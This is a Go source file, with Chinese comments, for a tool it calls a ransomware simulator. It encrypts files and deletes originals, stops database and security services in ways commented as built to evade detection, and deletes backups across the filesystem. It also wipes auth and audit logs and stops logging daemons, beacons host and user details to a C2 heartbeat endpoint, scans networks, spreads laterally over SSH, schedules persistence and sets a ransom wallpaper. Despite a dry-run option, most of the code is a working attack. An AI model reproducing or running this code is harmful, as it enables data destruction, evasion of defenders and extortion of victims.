	fmt.Println()
	fmt.Println("==================================================")
	fmt.Println("[!] 无法获取加密密钥，任务已中止")
	fmt.Println("==================================================")
	fmt.Println("[*] 处理方式:")
	fmt.Println("    1. 断网环境: 把公钥文件放到程序目录，文件名形如 public_key_<uuid>.pem")
	fmt.Printf("       程序目录: %s\n", programDir)
	fmt.Println("       （也兼容 public_key.pem 等任意 *.pem 公钥文件）")
	fmt.Println("    2. 有网络:   检查网络/代理后重新运行，联网成功后会自动在本地缓存公钥")
	fmt.Println("==================================================")
	fmt.Println()
}

// 初始化日志系统
func initLogging(enableLog bool) {
	logEnabled = enableLog
	if !logEnabled {
		return
	}

	// 使用程序所在目录作为日志目录
	logDirectory = programDir

	fmt.Printf("[*] 日志系统已启用，日志将输出到: %s\n", logDirectory)

	// 创建日志文件
	var err1, err2, err3 error
	successLogFile, err1 = os.OpenFile(
		filepath.Join(logDirectory, "success_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	failedLogFile, err2 = os.OpenFile(
		filepath.Join(logDirectory, "failed_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	operationsLogFile, err3 = os.OpenFile(
		filepath.Join(logDirectory, "operations.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	if err1 != nil || err2 != nil || err3 != nil {
		fmt.Printf("[!] 无法创建日志文件: success=%v, failed=%v, operations=%v\n", err1, err2, err3)
		logEnabled = false
	} else {
		// 写入日志文件头
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		header := fmt.Sprintf("=================== 勒索软件模拟器日志 ===================\n")
		header += fmt.Sprintf("程序版本: %s\n", version)
		header += fmt.Sprintf("开始时间: %s\n", timestamp)
		header += fmt.Sprintf("运行参数: %s\n", strings.Join(os.Args, " "))
		header += fmt.Sprintf("工作目录: %s\n", programDir)
		header += fmt.Sprintf("=========================================================\n\n")

		_, _ = successLogFile.WriteString(header)
		_, _ = failedLogFile.WriteString(header)
		_, _ = operationsLogFile.WriteString(header)
	}
}

// 关闭日志文件
func closeLogFiles() {
	if logEnabled {
		if successLogFile != nil {
			_ = successLogFile.Close()
		}
		if failedLogFile != nil {
			_ = failedLogFile.Close()
		}
		if operationsLogFile != nil {
			_ = operationsLogFile.Close()
		}
	}
}

// 记录成功加密的文件
func logSuccess(filePath string) {
	if !logEnabled || successLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] SUCCESS: %s -> %s.encrypted\n",
		timestamp, filePath, filePath)

	successLogFile.WriteString(logEntry)

	// 同时记录到操作日志
	logOperation(fmt.Sprintf("成功加密: %s", filePath))
}

// 记录加密失败的文件
func logFailed(filePath string, errorMsg string) {
	if !logEnabled || failedLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] FAILED: %s - %s\n",
		timestamp, filePath, errorMsg)

	failedLogFile.WriteString(logEntry)

	// 同时记录到操作日志
	logOperation(fmt.Sprintf("加密失败: %s - %s", filePath, errorMsg))
}

// 记录操作日志
func logOperation(message string) {
	if !logEnabled || operationsLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, message)

	operationsLogFile.WriteString(logEntry)
}

// 获取或解析公钥（带缓存）
func getPublicKey(publicKeyStr string) (*rsa.PublicKey, error) {
	publicKeyCacheLock.RLock()
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		publicKeyCacheLock.RUnlock()
		return publicKeyCache, nil
	}
	publicKeyCacheLock.RUnlock()

	// 解析公钥
	publicKeyCacheLock.Lock()
	defer publicKeyCacheLock.Unlock()

	// 再次检查，防止并发重复解析
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		return publicKeyCache, nil
	}

	// 清理公钥字符串，确保格式正确
	cleanedKeyStr := strings.TrimSpace(publicKeyStr)

	// 检查PEM格式
	if !strings.HasPrefix(cleanedKeyStr, "-----BEGIN") {
		// 尝试添加PEM头
		cleanedKeyStr = fmt.Sprintf("-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----", cleanedKeyStr)
	}

	// 解码PEM
	pemBlock, _ := pem.Decode([]byte(cleanedKeyStr))
	if pemBlock == nil {
		// 尝试不同的PEM格式
		if strings.Contains(cleanedKeyStr, "RSA PUBLIC KEY") {
			cleanedKeyStr = strings.Replace(cleanedKeyStr, "RSA PUBLIC KEY", "PUBLIC KEY", 1)
			pemBlock, _ = pem.Decode([]byte(cleanedKeyStr))
		}

		if pemBlock == nil {
			return nil, fmt.Errorf("解码PEM公钥失败: 无效的PEM格式")
		}
	}

	// 解析公钥
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		// 尝试解析PKCS1格式
		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
		if err != nil {
			return nil, fmt.Errorf("解析公钥失败: %w", err)
		}
	}

	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("公钥不是RSA类型")
	}

	// 更新缓存
	publicKeyCache = rsaPubKey
	publicKeyCacheStr = publicKeyStr

	return rsaPubKey, nil
}

// 新增功能：停止数据库服务（低特征版本）
// 优先使用 kill <pid> 发送 SIGTERM，避免 systemctl 触发安全告警
func stopDatabaseServices() {
	if logEnabled {
		logOperation("开始停止数据库服务")
	}

	for _, service := range databaseServices {
		fmt.Printf("  - 停止服务: %s\n", service)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试停止数据库服务: %s", service))
		}

		// 优先使用进程信号终止，而非 systemctl（降低检测特征）
		// 先尝试通过 pidof/pgrep 找到进程并发送 SIGTERM
		stopped := false
		pidCmd := exec.Command("pgrep", "-x", service)
		if output, err := pidCmd.Output(); err == nil && len(output) > 0 {
			pids := strings.Split(strings.TrimSpace(string(output)), "\n")
			for _, pid := range pids {
				pid = strings.TrimSpace(pid)
				if pid != "" {
					cmd := exec.Command("kill", pid) // 默认 SIGTERM，非暴力 kill -9
					_ = cmd.Run()
					stopped = true
				}
			}
		}

		// 如果进程信号方式失败，尝试 systemctl 作为回退（仅当必须时）
		if !stopped {
			cmd := exec.Command("systemctl", "stop", service)
			_ = cmd.Run()
		}

		// 应用随机延迟，打乱行为时序
		applyAggressiveDelay()

		time.Sleep(100 * time.Millisecond)
	}

	if logEnabled {
		logOperation("数据库服务停止完成")
	}
}

// applyAggressiveDelay 应用随机延迟，打乱行为时序特征
func applyAggressiveDelay() {
	if aggressiveDelay > 0 {
		delay := time.Duration(mrand.Intn(aggressiveDelay)) * time.Millisecond
		time.Sleep(delay)
	}
}

// 新增功能：停止安全服务（低特征版本）
// 移除 pkill -9 暴力杀进程，仅使用 systemctl/service 优雅停止
func stopSecurityServices() {
	if logEnabled {
		logOperation("开始停止安全服务")
	}

	for _, service := range securityServices {
		fmt.Printf("  - 停止安全服务: %s\n", service)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试停止安全服务: %s", service))
		}

		// 仅尝试使用 systemctl 优雅停止，移除 pkill -9 暴力操作
		cmd := exec.Command("systemctl", "stop", service)
		_ = cmd.Run()

		// 尝试使用service命令
		cmd = exec.Command("service", service, "stop")
		_ = cmd.Run()

		// 应用随机延迟，打乱行为时序
		applyAggressiveDelay()

		time.Sleep(100 * time.Millisecond)
	}

	if logEnabled {
		logOperation("安全服务停止完成")
	}
}

// 新增功能：清理数据库内存
func cleanDatabaseMemory() {
	if logEnabled {
		logOperation("开始清理数据库内存和缓存")
	}

	// 清理MySQL缓存
	cleanMySQLCache()

	// 清理PostgreSQL缓存
	cleanPostgreSQLCache()

	// 清理系统缓存
	cleanSystemMemory()

	if logEnabled {
		logOperation("数据库内存和缓存清理完成")
	}
}

func cleanMySQLCache() {
	fmt.Println("  - 清理MySQL缓存...")

	if logEnabled {
		logOperation("清理MySQL缓存")
	}

	// 尝试使用mysqladmin
	cmd := exec.Command("mysqladmin", "flush-tables")
	_ = cmd.Run()

	cmd = exec.Command("mysqladmin", "flush-logs")
	_ = cmd.Run()

	cmd = exec.Command("mysqladmin", "flush-hosts")
	_ = cmd.Run()

	cmd = exec.Command("mysqladmin", "flush-privileges")
	_ = cmd.Run()
}

func cleanPostgreSQLCache() {
	fmt.Println("  - 清理PostgreSQL缓存...")

	if logEnabled {
		logOperation("清理PostgreSQL缓存")
	}

	// 尝试清理PostgreSQL缓存
	cmd := exec.Command("psql", "-c", "DISCARD ALL;")
	_ = cmd.Run()
}

func cleanSystemMemory() {
	fmt.Println("  - 清理系统内存...")

	if logEnabled {
		logOperation("清理系统内存")
	}

	// 清理页面缓存
	cmd := exec.Command("sh", "-c", "sync && echo 1 > /proc/sys/vm/drop_caches")
	_ = cmd.Run()

	// 清理目录项和inode
	cmd = exec.Command("sh", "-c", "sync && echo 2 > /proc/sys/vm/drop_caches")
	_ = cmd.Run()

	// 清理页面缓存、目录项和inode
	cmd = exec.Command("sh", "-c", "sync && echo 3 > /proc/sys/vm/drop_caches")
	_ = cmd.Run()
}

// 新增功能：清除系统缓存
func clearSystemCache() {
	fmt.Println("  - 清除系统缓存...")

	if logEnabled {
		logOperation("清除系统缓存")
	}

	// 清理ARP缓存
	cmd := exec.Command("ip", "-s", "-s", "neigh", "flush", "all")
	_ = cmd.Run()

	// 清理DNS缓存
	cmd = exec.Command("systemctl", "restart", "systemd-resolved")
	_ = cmd.Run()

	cmd = exec.Command("service", "nscd", "restart")
	_ = cmd.Run()

	// 清理apt缓存
	cmd = exec.Command("apt-get", "clean")
	_ = cmd.Run()

	cmd = exec.Command("apt-get", "autoclean")
	_ = cmd.Run()
}

// 新增功能：解除进程守护（低特征版本）
// 移除 pkill -9 systemd/init 等极易触发安全告警的操作
// 仅保留 cron/atd 的 systemctl 操作
func disableProcessWatchdogs() {
	fmt.Println("  - 解除进程守护...")

	if logEnabled {
		logOperation("解除进程守护")
	}

	// 仅对非系统级守护进程（supervisor/monit）尝试优雅停止，不使用 pkill -9
	// 移除 systemd/init/upstart 等系统级进程的杀操作
	lightWatchdogs := []string{
		"supervisord", "monit",
		"daemontools", "s6", "nosh", "perp",
	}

	for _, wd := range lightWatchdogs {
		// 使用 systemctl 或 SIGTERM 优雅停止，不使用 pkill -9
		cmd := exec.Command("systemctl", "stop", wd)
		_ = cmd.Run()

		// 应用随机延迟
		applyAggressiveDelay()
	}

	// 禁用 cron（仅 systemctl，不直接杀进程）
	cmd := exec.Command("systemctl", "stop", "cron")
	_ = cmd.Run()

	cmd = exec.Command("systemctl", "disable", "cron")
	_ = cmd.Run()

	applyAggressiveDelay()

	// 禁用 atd
	cmd = exec.Command("systemctl", "stop", "atd")
	_ = cmd.Run()

	cmd = exec.Command("systemctl", "disable", "atd")
	_ = cmd.Run()

	if logEnabled {
		logOperation("进程守护解除完成")
	}
}

// 新增功能：解挂数据库链接（低特征版本）
// 移除 ss -K 关闭所有网络连接，使用 SIGTERM 替代 kill -9
func unmountDatabaseConnections() {
	fmt.Println("  - 解挂数据库链接...")

	if logEnabled {
		logOperation("解挂数据库链接")
	}

	// 杀死数据库客户端连接进程（使用 SIGTERM 而非 kill -9）
	dbProcesses := []string{
		"mysql", "psql", "mongo", "redis-cli", "sqlplus",
		"cqlsh", "influx", "clickhouse-client",
	}

	for _, proc := range dbProcesses {
		cmd := exec.Command("pkill", proc) // 默认 SIGTERM，不使用 -9
		_ = cmd.Run()

		applyAggressiveDelay()
	}

	// 查找并终止数据库端口的连接进程（使用 SIGTERM）
	ports := []string{"3306", "5432", "27017", "6379", "1521", "9042", "8086", "8123"}

	for _, port := range ports {
		cmd := exec.Command("lsof", "-ti", ":"+port)
		if output, err := cmd.Output(); err == nil {
			pids := strings.TrimSpace(string(output))
			if pids != "" {
				pidList := strings.Split(pids, "\n")
				for _, pid := range pidList {
					pid = strings.TrimSpace(pid)
					if pid != "" {
						cmd := exec.Command("kill", pid) // 默认 SIGTERM
						_ = cmd.Run()

						if logEnabled {
							logOperation(fmt.Sprintf("终止数据库连接进程 PID %s (端口 %s)", pid, port))
						}
					}
				}
			}
		}
	}

	// 移除 ss -K（关闭所有网络连接极易触发安全告警）

	if logEnabled {
		logOperation("数据库链接解挂完成")
	}
}

func killLockingProcesses() {
	fmt.Println("\n[+] 终止占用文件的进程...")

	if logEnabled {
		logOperation("开始终止占用文件的进程")
	}

	for _, proc := range targetProcessesLinux {
		fmt.Printf("  - 终止进程: %s\n", proc)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试终止进程: %s", proc))
		}

		// 使用 SIGTERM 替代 pkill -9，降低暴力程度
		// 先尝试优雅终止
		cmd := exec.Command("pkill", "-f", proc) // 默认 SIGTERM，不使用 -9
		_ = cmd.Run()

		// 应用随机延迟，打乱行为时序
		applyAggressiveDelay()
	}
	time.Sleep(1 * time.Second)

	if logEnabled {
		logOperation("进程终止完成")
	}
}

func defaultLockPath() string {
	return filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
}

// forceReleaseLock 仅清理“持有者已不存在”的陈旧锁，避免误删正在运行的实例锁
func forceReleaseLock() {
	path := defaultLockPath()
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	pid, _ := strconv.Atoi(strings.TrimSpace(string(data)))
	if pid <= 0 || !processAlive(pid) {
		_ = os.Remove(path)
	}
}

func createSingleInstanceLock() bool {
	lockFilePath = defaultLockPath()
	attempts := 1
	if isDaemonChild() {
		// 等父进程退出释放锁（最多约 15 秒）；父进程异常退出时可通过 PID 检测接管
		attempts = 150
	}
	for i := 0; i < attempts; i++ {
		if tryAcquireLockFile() {
			return true
		}
		if i < attempts-1 {
			time.Sleep(100 * time.Millisecond)
		}
	}
	return false
}

func tryAcquireLockFile() bool {
	f, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0666)
	if err == nil {
		_, _ = f.WriteString(strconv.Itoa(os.Getpid()) + "\n")
		_ = f.Close()
		return true
	}
	data, readErr := os.ReadFile(lockFilePath)
	if readErr != nil {
		return false
	}
	pid, _ := strconv.Atoi(strings.TrimSpace(string(data)))
	if pid > 0 && processAlive(pid) {
		return false
	}
	// 持有者已退出：接管锁
	_ = os.Remove(lockFilePath)
	f2, err2 := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0666)
	if err2 != nil {
		return false
	}
	_, _ = f2.WriteString(strconv.Itoa(os.Getpid()) + "\n")
	_ = f2.Close()
	return true
}

func cleanupLockFile() {
	if lockFilePath != "" {
		_ = os.Remove(lockFilePath)
	}
}

func setupFlags(fs *flag.FlagSet) *options {
	opt := &options{}

	fs.IntVar(&opt.workers, "workers", runtime.NumCPU(), "并发 worker 数量")
	fs.BoolVar(&opt.dryRun, "dry-run", false, "演习模式")
	fs.StringVar(&opt.extensions, "ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
	fs.StringVar(&opt.directory, "dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
	fs.BoolVar(&opt.removeOriginal, "remove", false, "加密后删除原文件")
	fs.BoolVar(&opt.logFlag, "log", false, "启用日志功能，在程序所在目录输出日志文件")

	// 阶段2行为控制参数
	fs.BoolVar(&opt.stealthMode, "stealth", false, "隐秘模式：完全跳过阶段2的所有破坏性操作（停止服务、杀进程、清日志等）")
	fs.BoolVar(&opt.noStopServices, "no-stop-services", false, "跳过停止数据库和安全服务")
	fs.BoolVar(&opt.noKillProcs, "no-kill-procs", false, "跳过终止进程操作")
	fs.BoolVar(&opt.noClearLogs, "no-clear-logs", false, "跳过清除日志操作")
	fs.IntVar(&opt.aggressiveDelay, "aggressive-delay", 0, "各破坏操作之间的随机延迟上限（毫秒），0=不延迟，建议1000-5000")

	// ---- 后台驻留与密钥保留 ----
	fs.BoolVar(&opt.resident, "resident", false, "加密完成后驻留后台（保持心跳与单实例锁，Ctrl+C 退出）")
	fs.BoolVar(&opt.keepKey, "keep-key", false, "把密钥（UUID + 公钥）保存在内存与本地缓存中，任务结束后不删除")
	fs.StringVar(&heartbeatToken, "heartbeat-token", os.Getenv("RANSOM_HEARTBEAT_TOKEN"), "心跳接收密钥（服务端启用后需填写，随心跳以 X-Heartbeat-Token 发送）")

	// ---- 定时任务后台化 ----
	fs.BoolVar(&opt.foreground, "foreground", false, "定时任务保持前台等待（默认自动转入后台）")
	fs.BoolVar(&opt.noAutostart, "no-autostart", false, "不注册开机自启（重启后需手动启动）")
	fs.BoolVar(&opt.daemonChild, "daemon-child", false, "内部参数：后台子进程标记，请勿手动使用")

	// ---- 定时触发 ----
	fs.DurationVar(&opt.delay, "delay", 0, "启动前等待时长（如 30s/5m/2h），0=不等待")
	fs.StringVar(&opt.atTime, "at", "", "定时启动时刻（2006-01-02 15:04:05 / 15:04 / RFC3339，15:04 已过则顺延次日）")
	fs.DurationVar(&opt.randomDelay, "random-delay", 0, "在定时基础上叠加 0~X 的随机抖动，规避固定时序特征")
	fs.BoolVar(&opt.persistSchedule, "persist-schedule", false, "把定时注册为系统任务（systemd-run/at/crontab），程序退出后到点由系统唤起")
	fs.StringVar(&opt.scheduleTaskName, "schedule-task-name", "RansomSimTask", "系统定时任务名称")
	fs.BoolVar(&opt.scheduleCleanup, "schedule-cleanup", true, "定时任务执行结束后自动清理任务")
	fs.BoolVar(&opt.scheduledRun, "scheduled-run", false, "内部标记：由系统定时任务唤起（注册任务时自动添加，无需手动指定）")

	// ---- 模拟攻击扫描（攻击面侦察）----
	fs.BoolVar(&opt.scan, "scan", false, "启用攻击面侦察（本地网段/指定目标的 TCP 端口发现）")
	fs.BoolVar(&opt.scanOnly, "scan-only", false, "仅执行侦察并输出报告，不加密文件、不执行破坏性操作")
	fs.StringVar(&opt.scanTargets, "scan-targets", "", "侦察目标（逗号分隔的 IP/CIDR/主机名，auto=自动使用本机网段）")
	fs.StringVar(&opt.scanTargetsFile, "scan-targets-file", "", "侦察目标清单文件（每行一个目标，# 开头为注释）")
	fs.StringVar(&opt.scanPorts, "scan-ports", "", "侦察端口列表（逗号分隔），默认内置常见企业服务端口")
	fs.IntVar(&opt.scanWorkers, "scan-workers", 128, "侦察并发数")
	fs.DurationVar(&opt.scanTimeout, "scan-timeout", 800*time.Millisecond, "单端口探测超时")
	fs.BoolVar(&opt.scanICMP, "scan-icmp", false, "先用 ping 探活再扫端口")

	// ---- 远程横向加密编排 ----
	fs.StringVar(&opt.remoteHosts, "remote-hosts", "", "远程目标（逗号分隔，支持 user@host、host:port）")
	fs.StringVar(&opt.remoteHostsFile, "remote-hosts-file", "", "远程目标清单文件（每行一个目标，# 开头为注释）")
	fs.BoolVar(&opt.remoteAuto, "remote-auto", false, "使用侦察结果中开放 SSH/SMB/WinRM 的主机作为远程目标（配合 --scan）")
	fs.StringVar(&opt.remoteUser, "remote-user", "", "远程认证用户名")
	fs.StringVar(&opt.remotePass, "remote-pass", "", "远程认证口令（需要 sshpass，推荐改用私钥认证）")
	fs.StringVar(&opt.remoteDomain, "remote-domain", "", "远程认证域（仅 Windows 控制端使用）")
	fs.StringVar(&opt.remoteKey, "remote-key", "", "SSH 私钥路径（推荐认证方式）")
	fs.IntVar(&opt.remotePort, "remote-port", 0, "远程目标端口（默认 22）")
	fs.StringVar(&opt.remoteMethod, "remote-method", "auto", "远程通道: auto|ssh|deploy-only（deploy-only=仅投递）")
	fs.StringVar(&opt.remoteStaging, "remote-staging", defaultRemoteStaging, "远端暂存目录（如 /tmp/.rs_sim）")
	fs.StringVar(&opt.remoteArgs, "remote-args", "", "透传给远端 encryptor 的额外参数（如 \"-workers 8 -ext .docx\"）")
	fs.BoolVar(&opt.remoteConfirm, "remote-confirm", false, "确认真实执行远端加密（缺省仅做连通性+投递演练，远端以 -dry-run 运行）")
	fs.BoolVar(&opt.remoteCleanup, "remote-cleanup", false, "远程执行结束后清理远端暂存目录")

	fs.Usage = func() {
		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
		_, _ = fmt.Fprintf(os.Stderr, "密钥获取优先级: 1) API接口获取 2) 本地公钥文件\n")
		_, _ = fmt.Fprintf(os.Stderr, "本地公钥文件格式:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - public_key_<uuid>.pem: 公钥文件，例如 public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem\n")
		_, _ = fmt.Fprintf(os.Stderr, "注意: 当API不可用时，UUID将从公钥文件名中自动提取\n")
		_, _ = fmt.Fprintf(os.Stderr, "日志文件将输出到程序所在目录:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - success_encrypted.log: 成功加密的文件列表\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - failed_encrypted.log:  加密失败的文件列表\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - operations.log:        操作日志\n")
		_, _ = fmt.Fprintf(os.Stderr, "\n阶段2（防御规避）控制参数:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --stealth: 隐秘模式，完全跳过破坏性操作\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --no-stop-services: 跳过停止数据库/安全服务\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --no-kill-procs: 跳过终止进程\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --no-clear-logs: 跳过清除日志\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --aggressive-delay: 操作间随机延迟(ms)\n")
		_, _ = fmt.Fprintf(os.Stderr, "\n后台驻留与密钥保留:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --resident: 加密完成后驻留后台（保持心跳，Ctrl+C 退出）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --keep-key: 密钥保存在内存与本地缓存，任务结束后不删除\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --heartbeat-token: 心跳接收密钥（服务端启用后必填）\n")
		_, _ = fmt.Fprintf(os.Stderr, "\n定时触发:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --delay / --at / --random-delay: 定时启动（默认自动转入后台，无需 nohup）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --foreground: 保持前台等待（不自动后台化）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --no-autostart: 不注册开机自启（重启后需手动启动）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --persist-schedule: 注册系统定时任务（systemd-run/at/crontab）\n")
		_, _ = fmt.Fprintf(os.Stderr, "\n模拟攻击扫描:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --scan / --scan-only: 攻击面侦察（端口发现 + 本机资产 + 报告）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --scan-targets / --scan-targets-file: 侦察目标\n")
		_, _ = fmt.Fprintf(os.Stderr, "\n远程横向加密（SSH 通道）:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --remote-hosts / --remote-hosts-file / --remote-auto: 远程目标\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --remote-key: 推荐使用私钥认证（口令认证需 sshpass）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  --remote-confirm: 确认真实执行远端加密（缺省仅投递+演练）\n")
		fs.PrintDefaults()
	}
	return opt
}

func showWarning(dryRun bool) {
	_, _ = fmt.Fprintf(os.Stderr, "\n************************** 警告 **************************\n")
	_, _ = fmt.Fprintf(os.Stderr, "此程序将自动扫描并加密指定范围内的文件。\n")
	_, _ = fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\n")
	_, _ = fmt.Fprintf(os.Stderr, "**********************************************************\n\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
	} else {
		fmt.Println(">>> 警告: 实时攻击模式已激活！将在 3 秒后自动开始...")
		time.Sleep(3 * time.Second)
	}
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\r程序已退出。                                  ")
}

// ---------------------------------------------------------------------------
// 终端心跳：每 30 秒向 C2 上报一次，供管理后台统计在线终端
// ---------------------------------------------------------------------------

var heartbeatState struct {
	mu      sync.RWMutex
	keyUUID string
	mode    string
	started atomic.Bool
	startAt time.Time
}

// setHeartbeatKey 记录本次运行使用的加密密钥 UUID（获取密钥后调用）
func setHeartbeatKey(uuid string) {
	heartbeatState.mu.Lock()
	heartbeatState.keyUUID = uuid
	heartbeatState.mu.Unlock()
}

// terminalID 生成稳定的终端标识（主机名 + 系统 + 架构 + 用户名 的指纹）
func terminalID() string {
	host, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	sum := sha256.Sum256([]byte(host + "|" + runtime.GOOS + "|" + runtime.GOARCH + "|" + user))
	sum[6] = (sum[6] & 0x0f) | 0x40
	sum[8] = (sum[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", sum[0:4], sum[4:6], sum[6:8], sum[8:10], sum[10:16])
}

// startHeartbeat 启动心跳协程：启动后 2 秒立即上报一次，之后每 30 秒上报一次
func startHeartbeat(mode string) {
	heartbeatState.mu.Lock()
	heartbeatState.mode = mode
	heartbeatState.mu.Unlock()
	heartbeatState.startAt = time.Now()
	heartbeatState.started.Store(true)

	go func() {
		time.Sleep(2 * time.Second)
		sendHeartbeat("start")
		ticker := time.NewTicker(heartbeatInterval)
		defer ticker.Stop()
		for range ticker.C {
			sendHeartbeat("ping")
		}
	}()
}

// stopHeartbeat 正常退出时上报一次 stop，让管理后台立即标记离线
func stopHeartbeat() {
	if !heartbeatState.started.Load() {
		return
	}
	heartbeatState.started.Store(false)
	sendHeartbeat("stop")
}

func sendHeartbeat(event string) {
	host, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}

	heartbeatState.mu.RLock()
	mode := heartbeatState.mode
	keyUUID := heartbeatState.keyUUID
	heartbeatState.mu.RUnlock()

	payload := map[string]interface{}{
		"id":       terminalID(),
		"hostname": host,
		"username": user,
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"version":  version,
		"mode":     mode,
		"key_uuid": keyUUID,
		"pid":      os.Getpid(),
		"uptime_s": int64(time.Since(heartbeatState.startAt).Seconds()),
		"event":    event,
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return
	}

	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("POST", heartbeatURL, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Ransom-Simulator/"+version+" ("+runtime.GOOS+"/"+runtime.GOARCH+")")
	if heartbeatToken != "" {
		req.Header.Set("X-Heartbeat-Token", heartbeatToken)
	}

	resp, err := client.Do(req)
	if err != nil {
		if logEnabled {
			logOperation(fmt.Sprintf("心跳上报失败: %v", err))
		}
		return
	}
	defer func() { _ = resp.Body.Close() }()
	_, _ = io.Copy(io.Discard, resp.Body)
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("\n[+] 执行破坏性操作...")
	fmt.Println("  - [IOC] 模拟: 清除备份和日志文件...")

	if logEnabled {
		logOperation("开始执行破坏性操作：清除备份和日志文件")
	}

	// 查找并删除备份文件
	backupPatterns := []string{"*.bak", "*.backup", "*.old", "backup_*", "*_backup*"}
	for _, pattern := range backupPatterns {
		cmd := exec.Command("find", "/", "-name", pattern, "-type", "f", "-exec", "rm", "-f", "{}", ";")
		_ = cmd.Run()
	}

	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")

	// 清空日志文件
	logFiles := []string{
		"/var/log/auth.log",
		"/var/log/secure",
		"/var/log/messages",
		"/var/log/syslog",
		"/var/log/kern.log",
		"/var/log/audit/audit.log",
		"/var/log/wtmp",
		"/var/log/btmp",
		"/var/log/lastlog",
	}

	for _, logFile := range logFiles {
		if _, err := os.Stat(logFile); err == nil {
			_ = os.WriteFile(logFile, []byte(""), 0644)

			if logEnabled {
				logOperation(fmt.Sprintf("清空日志文件: %s", logFile))
			}
		}
	}

	// 禁用日志服务
	cmd := exec.Command("systemctl", "stop", "rsyslog")
	_ = cmd.Run()

	cmd = exec.Command("systemctl", "stop", "systemd-journald")
	_ = cmd.Run()

	if logEnabled {
		logOperation("破坏性操作完成")
	}

	time.Sleep(1 * time.Second)
}

func getLinuxDesktopPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	possibleDirs := []string{
		filepath.Join(home, "Desktop"),
		filepath.Join(home, "桌面"),
		filepath.Join(home, "Escritorio"),   // Spanish
		filepath.Join(home, "Schreibtisch"), // German
		filepath.Join(home, "Bureau"),       // French
		home,
	}
	for _, dir := range possibleDirs {
		if _, err := os.Stat(dir); err == nil {
			return dir
		}
	}
	return home
}

// createRansomWallpaper 生成勒索提示壁纸并设置为当前用户桌面背景
// removeOriginal 为 true 时壁纸会额外显示“源文件已被删除”的提示
func createRansomWallpaper(uuid string, removeOriginal bool) {
	fmt.Println("[*] 生成并设置勒索提示壁纸...")

	if logEnabled {
		logOperation(fmt.Sprintf("开始生成勒索提示壁纸 (删除源文件: %v)", removeOriginal))
	}

	// 优先输出到程序所在目录，不可用时回退到用户主目录
	outPath := filepath.Join(programDir, ransomWallpaperFileName)
	if _, err := os.Stat(programDir); err != nil {
		if home, herr := os.UserHomeDir(); herr == nil {
			outPath = filepath.Join(home, ransomWallpaperFileName)
		}
	}

	if err := generateRansomWallpaper(outPath, uuid, removeOriginal); err != nil {
		fmt.Printf("[!] 生成壁纸失败: %v\n", err)
		if logEnabled {
